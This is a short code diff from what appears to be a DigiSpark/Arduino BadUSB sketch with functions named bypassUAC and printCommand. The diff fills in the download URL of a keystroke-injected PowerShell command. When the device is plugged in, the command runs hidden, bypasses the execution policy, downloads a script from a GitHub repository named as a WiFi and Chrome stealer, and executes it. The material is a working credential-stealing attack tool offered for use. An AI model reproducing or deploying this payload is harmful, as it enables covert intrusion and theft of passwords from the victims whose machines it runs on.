@@ -36,7 +36,7 @@ void bypassUAC(){
 }
 
 void printCommand(){
-    Keyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('LINK_HERE', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
+    Keyboard.println("PowerShell.exe -windowstyle hidden Set-ExecutionPolicy Bypass -Force (new-object System.Net.WebClient).DownloadFile('https://github.com/justwibi/Wifi-and-Chrome-DigiSparkStealer-.git', 'b.ps1'); Set-ExecutionPolicy Unrestricted; .\\b.ps1");
     typeKeyFast(KEY_RETURN);
 }
 
